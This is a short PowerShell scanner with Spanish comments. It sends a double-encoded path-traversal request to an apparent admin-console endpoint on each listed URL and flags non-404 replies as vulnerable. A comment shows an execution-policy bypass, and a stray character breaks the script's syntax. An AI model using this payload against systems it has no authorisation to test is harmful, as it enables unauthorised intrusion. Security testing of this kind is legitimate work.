#Bypass para este script
#Set-ExecutionPolicy Bypass -Scope Process


if($args[0] -eq $null){i
    Write-Host "Los argumentos deben ser la url o un archivo con las urls a probar"
    break
}

if(Test-Path $args[0] -PathType Leaf){
    $objetivos = Get-Content $args[0]
}
else{
    $objetivos = "$($args[0])"
}

foreach($url in $objetivos){
    
    #Quita / del final
    if($url.endswith("/")){
        $url = $url -replace ".$"
    }

    $url = "$($url)/console/css/%252e%252e%252f/consolejndi.portal"
    try{
        $respuesta=Invoke-WebRequest $url -UseBasicParsing
        if($respuesta.StatusCode -ne 404){
            Write-Host "[" -NoNewline; Write-Host -ForegroundColor Red "!" -NoNewline; Write-Host "] $url " -NoNewline; Write-Host "(" -NoNewline; Write-Host -ForegroundColor Green "$($respuesta.StatusCode)" -NoNewline; Write-Host ")" -NoNewline; Write-Host " --> " -NoNewline; Write-Host -ForegroundColor Red "VULNERABLE"
        }
    }
    catch [System.Net.WebException] {
        Write-Host "[" -NoNewline; Write-Host -ForegroundColor Yellow "!" -NoNewline; Write-Host "] $url " -NoNewline; Write-Host "(" -NoNewline; Write-Host -ForegroundColor Yellow "$($respuesta.StatusCode)" -NoNewline; Write-Host ")" -NoNewline; Write-Host " --> " -NoNewline; Write-Host -ForegroundColor Green "SE VE BIEN ;)"
        Continue
    }
}
